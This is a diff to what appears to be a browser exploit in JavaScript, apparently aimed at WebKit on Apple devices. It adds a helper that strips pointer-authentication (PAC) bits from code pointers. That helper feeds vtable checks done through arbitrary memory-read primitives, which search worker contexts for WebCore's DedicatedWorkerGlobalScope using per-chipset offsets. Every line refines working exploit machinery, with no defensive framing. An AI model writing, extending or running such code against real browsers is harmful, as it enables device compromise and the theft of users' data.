@@ -106,6 +106,9 @@ function stripPointerForRead(value, label, log) {
         log(`${label}: stripped ${value.hex()} -> ${stripped.hex()}`);
     return stripped;
 }
+function codePointerNoPac(value) {
+    return value.noPAC() & 0x7fffffffffn;
+}
 function isLikelyReadablePointer(value) {
     const ptr = value.noPAC();
     return ptr > 0x100000000n && ptr < 0x2000000000n && (ptr & 0x7n) === 0n;
@@ -18238,8 +18241,8 @@ const device_chipset = {
 
               resolverCheckpoint(`context[${i}] reading vtable at ${scriptExecutionContext.hex()}`);
               const vtable = read64(scriptExecutionContext);
-              const vtableNoPac = vtable.noPAC();
-              resolverCheckpoint(`context[${i}] vtable=${vtable.hex()} nopac=${vtableNoPac.hex()}`);
+              const vtableNoPac = codePointerNoPac(vtable);
+              resolverCheckpoint(`context[${i}] vtable=${vtable.hex()} nopac=${vtable.noPAC().hex()} code=${vtableNoPac.hex()}`);
               if (vtableNoPac != offsets.WebCore__DedicatedWorkerGlobalScope_vtable)
                   continue;
 
@@ -18624,9 +18627,10 @@ async function main() {
             const key = p.read64(ptr);
             if (!key) continue;
             const context = p.read64(ptr + 0x20n);
-            const vtable = p.read64(context).noPAC();
+            const vtableRaw = p.read64(context);
+            const vtable = codePointerNoPac(vtableRaw);
             if (vtable != offsets.WebCore__DedicatedWorkerGlobalScope_vtable) continue;
-            workerResolverCheckpoint(`context ${i} worker=${context.hex()}`);
+            workerResolverCheckpoint(`context ${i} worker=${context.hex()} vtable=${vtableRaw.hex()} code=${vtable.hex()}`);
             const workerOrWorkletThreadRaw = p.read64(context + 0x160n);
             const workerOrWorkletThread = stripPointerForRead(workerOrWorkletThreadRaw, "workerOrWorkletThread", workerResolverCheckpoint);
             if (!isLikelyReadablePointer(workerOrWorkletThread)) {
